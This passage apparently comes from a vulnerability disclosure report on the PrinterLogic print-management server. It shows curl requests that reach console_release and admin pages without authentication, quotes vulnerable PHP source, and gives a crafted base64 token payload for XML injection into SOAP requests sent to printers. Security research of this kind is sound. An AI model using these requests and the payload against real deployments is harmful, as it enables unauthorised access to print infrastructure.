Feb  1 01:06:46 printerlogic va/printercloud_pi.1.6x121o9j76phpwxma6fzk3ga3[1398]: 2022/02/01 01:06:46 [error] 98#98: *81 FastCGI sent in stderr: "PHP message: [2022-02-01 01:06:46] production.ERROR: {"instance":"10.105.0.241","dbname":"app_pi","dbhost":"mysql","originator":"http:\/\/10.105.0.241\/admin\/design\/reports\/overview_color.php","route":"admin\/{dir1?}\/{dir2?}\/{dir3?}\/{dir4?}\/{dir5?}"} [dd.trace_id=4795729321180279321 dd.span_id=4795729321180279321] array_shift() expects parameter 1 to be array, null given {"exception":"[object] (ErrorException(code: 0): array_shift() expects parameter 1 to be array, null given at /var/www/app/admin/design/reports/overview_color.php:12)"} []
Feb  1 01:06:46 printerlogic va/printercloud_pi.1.6x121o9j76phpwxma6fzk3ga3[1398]: PHP message: [2022-02-01 01:06:46] production.ERROR:
[...]
</code></pre>
<p>The <code>console_release</code> directory completely lacks authentication in several webpages:</p>
<pre><code>kali% curl -k 'http://10.105.0.241/console_release/common/validate_user.php?license_check=1&amp;printerId=4'

[{"pull_printer":null,"global_pull_printer":0,"app_installed":null,"secure_release":null,"ldap_rfid":"0","global_secure_release":0,"full_binding":0,"binding":1}]
</code></pre>
<p>This can be verified in the SaaS version of Printerlogic:</p>
<pre><code>kali% curl -kv 'https://[redacted].printercloud10.com/console_release/common/validate_user.php?license_check=1&amp;printerId=4'

[{"pull_printer":null,"global_pull_printer":"0","app_installed":null,"secure_release":null,"ldap_rfid":"0","global_secure_release":"0","full_binding":1,"binding":0}]
</code></pre>
<p>These pages are also freely available in the SaaS version, for example, it is possible to retrieve all the versions of Docker instances without authentication by visiting <code>https://[redacted].printercloud10.com/admin/design/management_accountts_serverinfo.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>kali% curl -kv https://[redacted].printercloud10.com/admin/design/management_accountts_serverinfo.php | grep server-info 
    &lt;<span style="color: #008000; font-weight: bold">div</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;server-info-head&quot;</span>&gt;
        &lt;<span style="color: #008000; font-weight: bold">table</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;server-info-about-header default-table&quot;</span>&gt;
                        &lt;<span style="color: #008000; font-weight: bold">div</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;server-info-version&quot;</span>&gt;Version&lt;/<span style="color: #008000; font-weight: bold">div</span>&gt;
                        &lt;<span style="color: #008000; font-weight: bold">div</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;server-info-release&quot;</span>&gt;Released&lt;/<span style="color: #008000; font-weight: bold">div</span>&gt;
                &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">width</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;60%&quot;</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;server-info-pad-prem&quot;</span>&gt;Windows&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">width</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;20%&quot;</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;server-info-pad-pc&quot;</span>&gt;25.0.0.587&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;server-info-pad-prem&quot;</span>&gt;Mac OS X&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;server-info-pad-pc&quot;</span>&gt;25.1.0.556&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;server-info-pad-prem&quot;</span>&gt;Linux (Debian/Ubuntu)&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;server-info-pad-pc&quot;</span>&gt;25.1.0.556&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;server-info-pad-prem&quot;</span>&gt;Red Hat Linux&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;server-info-pad-pc&quot;</span>&gt;25.1.0.556&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-prem&#39;</span>&gt;API Gateway Microservice&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-pc&#39;</span>&gt;1.212.2&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-prem&#39;</span>&gt;Authentication Microservice&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-pc&#39;</span>&gt;1.0.268&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-prem&#39;</span>&gt;Badge Reader Microservice&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-pc&#39;</span>&gt;1.0.62&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-prem&#39;</span>&gt;Control Panel Platform UI&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-pc&#39;</span>&gt;1.81.3&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-prem&#39;</span>&gt;External Badge Connector Microservice&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-pc&#39;</span>&gt;1.0.34&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-prem&#39;</span>&gt;IDP Integrations Microservice&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-pc&#39;</span>&gt;1.0.6&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-prem&#39;</span>&gt;Identity Microservice&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-pc&#39;</span>&gt;v1.0.88&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-prem&#39;</span>&gt;Print Queue Microservice&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-pc&#39;</span>&gt;5.0.124&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-prem&#39;</span>&gt;PrinterInstaller&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-pc&#39;</span>&gt;5.0.6607&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-prem&#39;</span>&gt;QMS Microservice&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-pc&#39;</span>&gt;1.0.124&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-prem&#39;</span>&gt;SCIM Microservice&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-pc&#39;</span>&gt;1.0.9&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-prem&#39;</span>&gt;Snmp Custom Data Microservice&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-pc&#39;</span>&gt;N/A&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-prem&#39;</span>&gt;Tree Microservice&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-pc&#39;</span>&gt;1.0.57&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-prem&#39;</span>&gt;User Microservice&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-pc&#39;</span>&gt;5.188.0&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-prem&#39;</span>&gt;API Keys UI&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-pc&#39;</span>&gt;0.1.4&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-prem&#39;</span>&gt;QR Code UI&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-pc&#39;</span>&gt;0.1.5&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-prem&#39;</span>&gt;Quota Management UI&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
                    &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;server-info-pad-pc&#39;</span>&gt;1.1.187&lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
</pre></div>

<p>The <code>console_release</code> directory also contains multiple pages reachable without authentication:</p>
<p><img alt="" src="images/2025-vasion-report-1-release-01.png" />
http://10.105.0.241/console_release/toshiba/console.php?printer_id=1</p>
<p><img alt="" src="images/2025-vasion-report-1-release-02.png" />
http://10.105.0.241/console_release/xerox/console.php?printer_id=1</p>
<p><img alt="" src="images/2025-vasion-report-1-release-04.png" />
http://10.105.0.241/console_release/samsung/console.php?printer_id=1</p>
<p><img alt="" src="images/2025-vasion-report-1-release-03.png" />
http://10.105.0.241/console_release/km/console.php?printer_id=1</p>
<p>When reading codes inside <code>console_release</code>, it is clear that the PHP code doesn't implement authentication:</p>
<p>Content of <code>/var/www/app/console_release/toshiba/change_screens.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
  <span style="color: #666666">2</span> 
  <span style="color: #666666">3</span> <span style="color: #008000; font-weight: bold">namespace</span> console_release\toshiba;
  <span style="color: #666666">4</span> 
  <span style="color: #666666">5</span> <span style="color: #008000; font-weight: bold">use</span> Illuminate\Support\Facades\Log;
  <span style="color: #666666">6</span> <span style="color: #008000; font-weight: bold">use</span> PrinterLogic\Models\Printer;
  <span style="color: #666666">7</span> 
  <span style="color: #666666">8</span> <span style="color: #008000; font-weight: bold">require_once</span>(<span style="color: #BA2121">&quot;global.php&quot;</span>);
  <span style="color: #666666">9</span> <span style="color: #008000; font-weight: bold">require_once</span>(ABSPATH <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;console_release/toshiba/toshiba_soap_helper.php&quot;</span>);
 <span style="color: #666666">10</span> 
 <span style="color: #666666">11</span> <span style="color: #19177C">$printer_id</span> <span style="color: #666666">=</span> requestint(<span style="color: #BA2121">&#39;printer_id&#39;</span>, <span style="color: #666666">0</span>);
 <span style="color: #666666">12</span> <span style="color: #19177C">$token</span> <span style="color: #666666">=</span> <span style="color: #008000">urldecode</span>(<span style="color: #008000">base64_decode</span>(requeststr(<span style="color: #BA2121">&#39;token&#39;</span>, <span style="color: #BA2121">&#39;&#39;</span>)));
 <span style="color: #666666">13</span> <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$printer_id</span> <span style="color: #666666">!=</span> <span style="color: #666666">0</span> <span style="color: #666666">&amp;&amp;</span> <span style="color: #19177C">$token</span> <span style="color: #666666">!=</span> <span style="color: #BA2121">&#39;&#39;</span>) {
 <span style="color: #666666">14</span>     <span style="color: #008000; font-weight: bold">try</span> {
 <span style="color: #666666">15</span>         <span style="color: #19177C">$printer</span> <span style="color: #666666">=</span> Printer<span style="color: #666666">::</span><span style="color: #7D9029">where</span>(<span style="color: #BA2121">&#39;id&#39;</span>, <span style="color: #19177C">$printer_id</span>)<span style="color: #666666">-&gt;</span><span style="color: #7D9029">first</span>();
 <span style="color: #666666">16</span>         <span style="color: #19177C">$select_screen_response</span> <span style="color: #666666">=</span> select_screen(<span style="color: #19177C">$printer</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">host_address</span>, <span style="color: #19177C">$token</span>, <span style="color: #BA2121">&quot;Menu&quot;</span>);
 <span style="color: #666666">17</span>         Log<span style="color: #666666">::</span><span style="color: #7D9029">debug</span>(<span style="color: #BA2121">&quot;Toshiba change_screens, select_screen_response = &quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$select_screen_response</span>);
 <span style="color: #666666">18</span>         <span style="color: #19177C">$parser</span> <span style="color: #666666">=</span> <span style="color: #008000">xml_parser_create</span>();
 <span style="color: #666666">19</span>         <span style="color: #008000">xml_parse_into_struct</span>(<span style="color: #19177C">$parser</span>, <span style="color: #19177C">$select_screen_response</span>, <span style="color: #19177C">$vals</span>, <span style="color: #19177C">$index</span>);
 <span style="color: #666666">20</span>         <span style="color: #008000">xml_parser_free</span>(<span style="color: #19177C">$parser</span>);
 <span style="color: #666666">21</span>         Log<span style="color: #666666">::</span><span style="color: #7D9029">debug</span>(<span style="color: #008000">print_r</span>(<span style="color: #19177C">$vals</span>, <span style="color: #008000; font-weight: bold">true</span>));
 <span style="color: #666666">22</span>         Log<span style="color: #666666">::</span><span style="color: #7D9029">debug</span>(<span style="color: #008000">print_r</span>(<span style="color: #19177C">$index</span>, <span style="color: #008000; font-weight: bold">true</span>));
 <span style="color: #666666">23</span> 
 <span style="color: #666666">24</span>         <span style="color: #19177C">$logout_result</span> <span style="color: #666666">=</span> logout(<span style="color: #19177C">$printer_id</span>, <span style="color: #19177C">$token</span>);
 <span style="color: #666666">25</span>         Log<span style="color: #666666">::</span><span style="color: #7D9029">debug</span>(<span style="color: #BA2121">&quot;Toshiba change_screens, logout result:&quot;</span>);
 <span style="color: #666666">26</span>         Log<span style="color: #666666">::</span><span style="color: #7D9029">debug</span>(<span style="color: #008000">print_r</span>(<span style="color: #19177C">$logout_result</span>, <span style="color: #008000; font-weight: bold">true</span>));
 <span style="color: #666666">27</span>         <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$index</span>[<span style="color: #BA2121">&#39;SOAP-ENV:FAULT&#39;</span>]) <span style="color: #666666">&amp;&amp;</span> <span style="color: #008000">isset</span>(<span style="color: #19177C">$index</span>[<span style="color: #BA2121">&#39;EXC:DESCRIPTION&#39;</span>])) {
 <span style="color: #666666">28</span>             Log<span style="color: #666666">::</span><span style="color: #7D9029">debug</span>(<span style="color: #BA2121">&quot;error: &quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$vals</span>[<span style="color: #19177C">$index</span>[<span style="color: #BA2121">&#39;EXC:DESCRIPTION&#39;</span>][<span style="color: #666666">0</span>]][<span style="color: #BA2121">&#39;value&#39;</span>]);
 <span style="color: #666666">29</span>             <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;fail&quot;</span>;
 <span style="color: #666666">30</span>         } <span style="color: #008000; font-weight: bold">else</span> {
 <span style="color: #666666">31</span>             <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;success&quot;</span>;
 <span style="color: #666666">32</span>         }    
 <span style="color: #666666">33</span>     } <span style="color: #008000; font-weight: bold">catch</span>(Exception <span style="color: #19177C">$ex</span>) {
 <span style="color: #666666">34</span>         Log<span style="color: #666666">::</span><span style="color: #7D9029">debug</span>(<span style="color: #BA2121">&quot;Toshiba change_screens, error: &quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$ex</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getMessage</span>());
 <span style="color: #666666">35</span>         <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;fail&quot;</span>;
 <span style="color: #666666">36</span>     }    
 <span style="color: #666666">37</span> }
</pre></div>

<p>The variables <code>$token</code> and <code>$printer_id</code> are attacker-controlled data and there is no authentication.</p>
<p>The <code>select_screen</code> function is implemented in <code>/var/www/app/console_release/toshiba/toshiba_soap_helper.php</code> and the execution flow goes to a HTTP/HTTPS request (without verification of SSL certificates) with attacker-controlled data sent to the printer in the function <code>processCurl()</code>:</p>
<p>Content of <code>/var/www/app/console_release/toshiba/change_screens.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">769</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">select_screen</span>(<span style="color: #19177C">$ip</span>, <span style="color: #19177C">$token</span>, <span style="color: #19177C">$screen</span>)
<span style="color: #666666">770</span> {
<span style="color: #666666">771</span>     <span style="color: #19177C">$header</span> <span style="color: #666666">=</span> get_header(<span style="color: #19177C">$token</span>);
<span style="color: #666666">772</span>     <span style="color: #19177C">$body</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&lt;selectScreen xmlns=&quot;http://www.toshibatec.co.jp/e-STUDIO/DeviceService/DeviceControl&quot;&gt;&#39;</span>;
<span style="color: #666666">773</span>     <span style="color: #19177C">$body</span> <span style="color: #666666">.=</span> <span style="color: #BA2121">&#39;&lt;ScreenType&gt;&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$screen</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;&lt;/ScreenType&gt;&#39;</span>;
<span style="color: #666666">774</span>     <span style="color: #19177C">$body</span> <span style="color: #666666">.=</span> <span style="color: #BA2121">&#39;&lt;/selectScreen&gt;&#39;</span>;
<span style="color: #666666">775</span>
<span style="color: #666666">776</span>     <span style="color: #008000; font-weight: bold">return</span> processCurl(<span style="color: #19177C">$ip</span>, <span style="color: #19177C">$header</span>, <span style="color: #19177C">$body</span>, <span style="color: #BA2121">&quot;http://&quot;</span>);
<span style="color: #666666">777</span> }

<span style="color: #666666">555</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">get_header</span>(<span style="color: #19177C">$token</span>)
<span style="color: #666666">556</span> {
<span style="color: #666666">557</span>     <span style="color: #19177C">$header</span>  <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&lt;s:Header&gt;&#39;</span>;
<span style="color: #666666">558</span>     <span style="color: #19177C">$header</span> <span style="color: #666666">.=</span> <span style="color: #BA2121">&#39;&lt;h:sessionHeader xmlns:h=&quot;http://www.toshibatec.co.jp/e-STUDIO/Common&quot; xmlns=&quot;http://www.toshibatec.co.jp/e-STUDIO/Common&quot; xmlns:xsi=&quot;http    ://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&#39;</span>;
<span style="color: #666666">559</span>     <span style="color: #19177C">$header</span> <span style="color: #666666">.=</span> <span style="color: #BA2121">&#39;&lt;Token&gt;&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$token</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;&lt;/Token&gt;&#39;</span>;
<span style="color: #666666">560</span>     <span style="color: #19177C">$header</span> <span style="color: #666666">.=</span> <span style="color: #BA2121">&#39;&lt;/h:sessionHeader&gt;&#39;</span>;
<span style="color: #666666">561</span>     <span style="color: #19177C">$header</span> <span style="color: #666666">.=</span> <span style="color: #BA2121">&#39;&lt;/s:Header&gt;&#39;</span>;
<span style="color: #666666">562</span>     <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$header</span>;
<span style="color: #666666">563</span> }
</pre></div>

<p>With the <code>processCurl</code> function defined in <code>/var/www/app/console_release/toshiba/change_screens.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">11</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">processCurl</span>(<span style="color: #19177C">$url</span>, <span style="color: #19177C">$XRX_SOAP_HEADER</span>, <span style="color: #19177C">$body</span>, <span style="color: #19177C">$h_ref</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;https://&#39;</span>)
 <span style="color: #666666">12</span> {
 <span style="color: #666666">13</span>     <span style="color: #19177C">$FULL_XRX</span> <span style="color: #666666">=</span> processCurlBuildXRX(<span style="color: #19177C">$body</span>, <span style="color: #19177C">$XRX_SOAP_HEADER</span>);
 <span style="color: #666666">14</span>     <span style="color: #19177C">$XRX_URL</span> <span style="color: #666666">=</span> processCurlBuildURL(<span style="color: #19177C">$url</span>, <span style="color: #19177C">$h_ref</span>);
 <span style="color: #666666">15</span>     Log<span style="color: #666666">::</span><span style="color: #7D9029">debug</span>(<span style="color: #BA2121">&quot;Toshiba, toshiba_soap_helper, processCurl, url = &quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$XRX_URL</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;, full xrx = &quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$FULL_XRX</span>);
 <span style="color: #666666">16</span>
 <span style="color: #666666">17</span>     <span style="color: #19177C">$ch</span> <span style="color: #666666">=</span> <span style="color: #008000">curl_init</span>();
 <span style="color: #666666">18</span>     <span style="color: #19177C">$toshiba_url</span> <span style="color: #666666">=</span> config(<span style="color: #BA2121">&#39;cpa.toshiba.url&#39;</span>);
 <span style="color: #666666">19</span>     <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$toshiba_url</span> <span style="color: #666666">!==</span> <span style="color: #BA2121">&#39;&#39;</span>) {
 <span style="color: #666666">20</span>         <span style="color: #19177C">$headers</span> <span style="color: #666666">=</span> [
 <span style="color: #666666">21</span>             <span style="color: #BA2121">&#39;Host:&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$toshiba_url</span>,
 <span style="color: #666666">22</span>         ];
 <span style="color: #666666">23</span>     } <span style="color: #008000; font-weight: bold">else</span> {
 <span style="color: #666666">24</span>         <span style="color: #19177C">$headers</span> <span style="color: #666666">=</span> [
 <span style="color: #666666">25</span>             <span style="color: #BA2121">&#39;Host: &#39;</span> <span style="color: #666666">.</span> get_host(),
 <span style="color: #666666">26</span>         ];
 <span style="color: #666666">27</span>     }
 <span style="color: #666666">28</span>     <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_HTTPHEADER, <span style="color: #19177C">$headers</span>);
 <span style="color: #666666">29</span>     <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_URL, <span style="color: #19177C">$XRX_URL</span>);
 <span style="color: #666666">30</span>     <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_POST, <span style="color: #008000; font-weight: bold">true</span>);
 <span style="color: #666666">31</span>     <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_POSTFIELDS, <span style="color: #19177C">$FULL_XRX</span>); <span style="color: #666666">?</span> contains the retuned value of processCurlBuildXRX containing the attacker<span style="color: #666666">-</span>controlled data
 <span style="color: #666666">32</span>     <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_RETURNTRANSFER, <span style="color: #666666">1</span>);
 <span style="color: #666666">33</span>     <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span style="color: #008000; font-weight: bold">false</span>);
 <span style="color: #666666">34</span>     <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span style="color: #008000; font-weight: bold">false</span>);
 <span style="color: #666666">35</span>     <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_SSLVERSION, CURL_SSLVERSION_SSLv3);
</pre></div>

<p>There is no verification of the <code>$token</code> value. <code>$token</code> goes into several functions (including <code>processCurlBuildXRX()</code> that will add XML tags) but no checks are done and it is entirely possible for an attacker to add custom XML tags in order to craft XML data that will be sent by the remote printer, without authentication.</p>
<p>In order to bypass <code>$token</code>, an attacker can include the following XML-based data in the GET request (<code>?token=base64(..)</code>).</p>
<p>Crafting a custom <code>$token</code> value, to inject additional XML value (<code>CUSTOM-XML-HERE</code>):</p>
<pre><code>$token = base64("&lt;/Token&gt;&lt;/h:sessionHeader&gt;&lt;/s:Header&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;CUSTOM-XML-HERE&lt;!--")
</code></pre>
<p>The first tags will close the opened XML tags by the PHP code and the final <code>&lt;--</code> will comment out the rest of the tags added by the PHP code.</p>
<p>Using dynamic analysis, we can confirm this behavior.</p>
<p>Sending a request to PrinterLogic that will send request to a remote printer:</p>
<pre><code>kali% curl "http://10.105.0.241/console_release/toshiba/change_screens.php?printer_id=2&amp;token=$(echo XML-INJECTION | base64 -w0)"
</code></pre>
<p>On the machine that is declared as a printer in PrinterLogic, there is a HTTP request sent from PrinterLogic to the port 49629.</p>
<p>XML request sent to the printer without authentication and without filtering of data:</p>
